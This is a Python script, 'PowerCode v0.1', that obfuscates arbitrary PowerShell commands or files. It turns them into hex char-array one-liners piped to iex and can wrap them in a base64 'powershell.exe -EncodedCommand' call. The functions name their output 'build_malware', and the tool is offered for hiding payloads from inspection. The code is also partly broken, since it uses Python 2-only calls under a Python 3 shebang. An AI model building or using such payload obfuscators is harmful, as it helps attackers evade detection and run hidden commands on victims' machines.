#!/usr/bin/python3
#-*- coding:utf-8 -*-

import base64
import os
import sys

def encode_string(string):
    encoded = base64.encodestring(string.encode("UTF-16-LE"))
    s = encoded.split("\n")
    return "".join(s)

def build_payload(payload):
    string = payload.encode("hex")
    new_payload = []
    i = 0

    while i < len(string):
        if i % 2 ==0:
            new_payload.append("0x")
            new_payload.append(string[i])
            i = i+1
        
        elif i == len(string)-1:
            new_payload.append(string[i])
            break
            
        else:
            new_payload.append(string[i])
            new_payload.append(", ")
            i = i+1
    
    return "".join(new_payload)

template = """
$buffer = [cHAR[]] (%s);$buffer -JOIN "" | iex
"""

exec_encode_powershell = """powershell.exe -EncodedCommand %s"""

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("PowerCode v0.1 By Unam3dd")
        print("usage : %s -h/--help" % (sys.argv[0]))
    else:

        if sys.argv[1] =="-ps":
            payload_string = sys.argv[2]
            if len(sys.argv) <4:
                build_malware = build_payload(payload_string)
                template = """$buffer = [cHAR[]] (%s);$buffer -JOIN "" | iex""" % (build_malware)
                print(template)
            else:
                build_malware = build_payload(payload_string)
                template = """$buffer = [cHAR[]] (%s);$buffer -JOIN "" | iex""" % (build_malware)
                enc = encode_string(template)
                exec_encode_powershell = """powershell.exe -EncodedCommand %s""" % (enc)
                print(exec_encode_powershell)
        
        elif sys.argv[1] =="-pf":
            payload_file = sys.argv[2]
            check_file = os.path.exists(payload_file)
            if check_file ==True:
                print("[*] %s Found..." % (sys.argv[2]))
                print("[*] Generate Payload")
                f=open(payload_file,"r")
                content = f.read()
                build_malware = build_payload(content)
                template = """$buffer = [cHAR[]] (%s);$buffer -JOIN "" | iex""" % (build_malware)
                if len(sys.argv) ==5:
                    if sys.argv[3] =="-o":
                        out_file = sys.argv[4]
                        f=open(out_file,"w")
                        f.write(template)
                        f.close()
                        print("[*] Payload Writed Save As %s " % (out_file))
                    else:
                        print("[!] Options Not Found !")
            else:
                print("[!] %s Not Found !" % (payload_file))
    
        elif sys.argv[1] =="-h" or sys.argv[1] =="--help":
            print("PowerCode v0.1 By Unam3dd")
            print("usage : %s -h/--help" % (sys.argv[0]))
            print("        -ps <command>      payload string")
            print("        -e                 Encode String Command")
            print("        -pf <file>         Payload File")
            print("        -o  <name>         Output File")
            print("exemple:")
            print("       %s -ps <command>" % (sys.argv[0]))
            print("       %s -ps <command> -e" % (sys.argv[0]))
            print("       %s -pf <name>" % (sys.argv[0]))
            print("       %s -pf <file> -o out.ps1" % (sys.argv[0]))
    
        else:
            print("[!] Options Invalid enter %s -h/--help for show options" % (sys.argv[0]))